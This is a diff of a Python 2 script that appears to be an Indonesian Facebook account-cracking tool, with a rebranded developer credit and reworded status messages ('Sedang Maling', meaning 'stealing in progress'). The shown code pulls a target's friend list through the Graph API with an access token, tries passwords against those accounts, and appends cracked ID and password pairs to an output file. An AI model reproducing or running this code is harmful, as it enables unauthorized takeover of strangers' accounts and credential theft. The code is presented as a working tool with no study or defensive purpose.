@@ -9,15 +9,17 @@ import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,re
 from multiprocessing.pool import ThreadPool
 from requests.exceptions import ConnectionError
 from mechanize import Browser
-
-
 reload(sys)
-sys.setdefaultencoding('utf8')
-br = mechanize.Browser()
-br.set_handle_robots(False)
-br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
-br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 
+sys.setdefaultencoding('utf8')
+
+br = mechanize.Browser()
+
+br.set_handle_robots(False)
+
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
 def keluar():
 	print "\x1b[1;91mExit"
 	os.sys.exit()
@@ -55,7 +57,7 @@ S='\033[1;96m'
 P='\033[1;95m'
 Y='\033[1;93m'
 
-#Dev:TECH ABM
+#Dev:RAMDANI ID
 #### LOGO ####
 logo = """
 
@@ -392,7 +394,7 @@ def pilih_super():
 			print"\x1b[1;37m[⊱⋕⊰] ID Not Found!"
 			raw_input("\n\033[1;96m[\033[1;94mBack\033[1;96m]")
 			super()
-		print"\033[1;35;37m[⊱⋕⊰] Getting ID Loading process........ "
+		print"\033[1;35;37m[⊱⋕⊰] Target Maling Sedang Proses........ "
 		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
 		z = json.loads(r.text)
 		for i in z['data']:
@@ -408,7 +410,7 @@ def pilih_super():
 	jalan('\033[1;34;96m[⊱⋕⊰] Tunggu Bodoh ')
 	titik = ['.   ','..  ','... ']
 	for o in titik:
-		print("\r\033[1;32;40m[⊱⋕⊰] Maling\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
+		print("\r\033[1;32;40m[⊱⋕⊰] Sedang Maling\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;94m   ❈     \x1b[1;91mBerhenti Maling Tekan CTRL+Z \033[1;94m  ❈"
 	print "\033[1;96m⊱⋕⊰══════════════════════════════════════════⊱⋕⊰" 
 
@@ -418,7 +420,7 @@ def pilih_super():
 		try:
 			os.mkdir('out')
 		except OSError:
-			pass #Dev:Tech-abm
+			pass #Dev:Ramdani-ID
 		try:													
 			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)												
 			b = json.loads(a.text)												
@@ -615,7 +617,7 @@ def pilih_super():
 				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mName \x1b[1;93m    : \x1b[1;93m' + b['name']
 				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mID \x1b[1;93m      : \x1b[1;93m' + user
 				                                                                                                   print '\x1b[1;93m[•⊱✿⊰•] \x1b[1;93mPassword \x1b[1;93m: \x1b[1;93m' + pass9 + '\n'
-				                                                                                                   cek = open("out/super_cp.txt", "a")
+				                                                                                                   cek = open("out/target_baru.txt", "a")
 				                                                                                                   cek.write("ID:" +user+ " Pw:" +pass9+"\n")
 				                                                                                                   cek.close()
 				                                                                                                   cekpoint.append(user+pass9)	
